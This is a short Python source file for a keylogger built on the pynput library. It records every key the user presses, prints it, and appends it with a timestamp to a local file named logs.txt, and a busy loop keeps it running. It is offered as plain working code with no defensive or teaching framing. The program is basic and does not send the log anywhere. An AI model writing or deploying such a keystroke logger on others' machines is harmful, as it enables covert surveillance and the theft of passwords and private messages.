from pynput import keyboard
import time

class KeyLogger():
	def __init__(self):
		self.filename = 'logs.txt'

	def get_char(self, key):
		try:
			return key.char
		except AttributeError:
			return str(key)

	def press(self, key):
		print(key)
		with open(self.filename, 'a') as logs: # open logs.txt file
			logs.write(self.get_char(key) + f' : {time.strftime("%H:%M:%S")}\n') # write pressed key to logs.txt

	def listener(self):
		listen = keyboard.Listener(on_press=self.press)
		listen.start()

if __name__ == '__main__':
	KeyLogger().listener()
	open(KeyLogger().filename, 'a').write('Session started : ' + time.strftime("%H:%M:%S") + '\n')
	while True: # loop to keep program running
		pass